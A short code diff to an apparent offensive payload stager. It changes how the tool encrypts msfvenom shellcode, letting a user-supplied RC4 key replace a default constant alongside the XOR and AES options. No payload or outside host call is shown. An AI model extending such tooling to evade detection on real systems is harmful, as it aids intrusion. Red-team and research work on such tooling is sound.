@@ -112,8 +112,13 @@ class Stager:
       print(f"Using XOR key {XOR_KEY}")
       self.shellcode = ak.ShellCode(self.msfvenom_cmd, xor_key=XOR_KEY)
     elif self.encrypt == 'rc4':
-      print(f"Using RC4 key {RC4_KEY}")
-      self.shellcode = ak.ShellCode(self.msfvenom_cmd, rc4_key=RC4_KEY)
+      if self.args.key != "":
+        rc4_key = self.args.key.encode('utf-8')
+      else:
+        # Randomly generated
+        rc4_key = RC4_KEY
+      print(f"Using RC4 key {rc4_key}")
+      self.shellcode = ak.ShellCode(self.msfvenom_cmd, rc4_key=rc4_key)
     elif self.encrypt == 'aes':
       if self.args.key != "":
         aes_key = self.args.key
